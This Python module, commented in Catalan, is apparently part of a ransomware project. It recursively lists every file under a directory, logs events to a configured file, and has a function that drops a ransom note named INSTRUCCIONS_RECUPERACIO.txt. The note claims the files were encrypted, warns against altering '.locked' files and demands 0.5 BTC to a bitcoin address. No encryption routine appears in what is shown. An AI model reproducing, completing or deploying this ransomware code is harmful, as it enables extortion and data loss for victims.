import os
import config
from datetime import datetime

# Configurem la ruta del log

def llistar_fitxers(ruta):
    llista_final = []
    if os.path.exists(ruta):
        for arrel, directoris, fitxers in os.walk(ruta):
            for nom in fitxers:
                # Ajuntem la ruta per a subcarpetes
                llista_final.append(os.path.join(arrel, nom))
        return llista_final
    return []

def registrar_log(esdeveniment, fitxer):
    # En lloc d'usar "logs/activity.log", usem la ruta del config
    ruta_real = config.FILE_LOGS
    
    # Ens assegurem que la carpeta data/logs existeixi realment
    os.makedirs(os.path.dirname(ruta_real), exist_ok=True)
    
    # Escrivim al fitxer definit al config (data/logs/activity.jsonl)
    with open(ruta_real, "a", encoding="utf-8") as f:
        f.write(f"[{esdeveniment}] Fitxer: {fitxer}\n")

def llegir_logs():
    print("\n--- HISTORIAL D ACTIVITAT (LOGS) ---")
    if os.path.exists(config.FILE_LOGS):
        try:
            with open(config.FILE_LOGS, "r", encoding="utf-8") as f:
                contingut = f.read()
                if contingut:
                    print(contingut)
                else:
                    print("[!] El fitxer de logs esta buit.")
        except Exception as e:
            print(f"[X] Error llegint els logs: {e}")
    else:
        print("[!] No hi ha logs disponibles.")
    print("------------------------------------\n")

def generar_nota_rescat(directori):
    contingut = (
        "HEM XIFRAT ELS TEUS FITXERS!\n\n"
        "Per recuperar les dades, necessites la clau de desxifratge.\n"
        "1. No intentis modificar els fitxers .locked.\n"
        "2. Envia 0.5 BTC a l adreca: bc1qxy2kgdy6jrsqx7644vvv\n"
        
    )

    ruta_nota = os.path.join(directori, "INSTRUCCIONS_RECUPERACIO.txt")
    
    try:
        with open(ruta_nota, "w", encoding="utf-8") as f:
            f.write(contingut)
        print(f"[+] Nota de rescat creada a: {ruta_nota}")
    except Exception as e:
        print(f"[X] ERROR CREANT LA NOTA: {e}")
